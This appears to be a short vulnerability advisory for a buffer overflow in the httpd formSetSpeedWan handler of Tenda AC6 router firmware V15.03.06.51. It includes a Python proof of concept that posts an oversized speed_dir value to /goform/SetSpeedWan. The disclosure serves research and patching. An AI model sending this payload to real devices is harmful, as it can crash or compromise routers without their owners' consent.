# buffer overflow

## Tenda_AC6

version: V15.03.06.51

## Description:

There is a buffer overflow in httpd/formSetSpeedWan

## Source:

you may download it from : https://www.tendacn.com/download/detail-3794.html

## Analyse:


![](../Tenda_AC10U_V1/13.png)

get value from speed_dir, then call sprintf, cause buff overflow





## POC
```
url = "http://192.168.1.13/goform/SetSpeedWan"
payload = 'A'*0x1000 + '\n'

r = requests.post(url, data={'speed_dir': payload})
``` 
